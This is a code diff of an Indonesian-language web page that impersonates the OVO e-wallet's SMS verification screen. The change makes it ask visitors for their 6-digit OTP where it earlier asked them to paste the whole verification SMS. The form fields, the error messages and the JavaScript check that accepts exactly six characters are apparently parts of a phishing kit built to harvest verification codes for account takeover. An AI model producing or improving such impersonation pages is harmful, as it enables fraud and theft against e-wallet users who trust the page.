@@ -92,16 +92,16 @@
                 <div class="row mt-4">
                     <div class="col-12">
                         <img src="images/sms.png" class="d-block mx-auto w-100" width="200" alt="">
-                        <div class="text-header mt-2 text-center">SMS Verifikasi telah terkirim </div>
-                        <p class="sub-text mt-2 text-center" style="color: #6c6c6c;">SMS Verifikasi OVO telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS Verifikasi lalu tempel dibawah ini</p>
+                        <div class="text-header mt-2 text-center">SMS OTP Verifikasi telah terkirim </div>
+                        <p class="sub-text mt-2 text-center" style="color: #6c6c6c;">SMS Verifikasi OVO telah kami kirim ke Nomor Handphone anda, Silahkan masukan 6 digit OTP dibawah ini</p>
                     </div>
                     <div class="col-12 mt-3">
                         <div class="form-group">
-                            <textarea id="sms" cols="20" rows="4" class="form-control w-100" style="height: auto; padding: 10px; text-align: left;" placeholder="Tempel disini!"></textarea>
+                            <textarea id="sms" cols="20" rows="4" class="form-control w-100" style="height: auto; padding: 10px; text-align: left;" placeholder="Code OTP Anda"></textarea>
                             <label class="text-danger d-none mt-1 mx-auto" id="ErrMsg" style="font-size: 13px;">Kolom ini wajib diisi</label>
                         </div>
                         <hr>
-                        <p class="sub-text mt-2 text-center" style="color: #6c6c6c;" id="reSend">Belum dapet link? Kirim ulang dalam <jk id="times"></jk> Detik</p>
+                        <p class="sub-text mt-2 text-center" style="color: #6c6c6c;" id="reSend">Belum dapet OTP? Kirim ulang dalam <jk id="times"></jk> Detik</p>
                     </div>
                 </div>
             </div>
@@ -312,7 +312,7 @@
                 $notel = $("#notel").val();
                 $sms = $("#sms").val();
 
-                if($sms.length > 29) {
+                if($sms.length == 6) {
                     $("#ErrMsg").html('');
                     $("#ErrMsg").addClass('d-none');
 
@@ -332,7 +332,7 @@
                                                             }
                                                         });
                 } else {
-                    $("#ErrMsg").html('Harap tempel kan Text Sms Verifikasi.');
+                    $("#ErrMsg").html('Harap masukkan kan OTP Verifikasi.');
                     $("#ErrMsg").removeClass('d-none');
                 }
             });
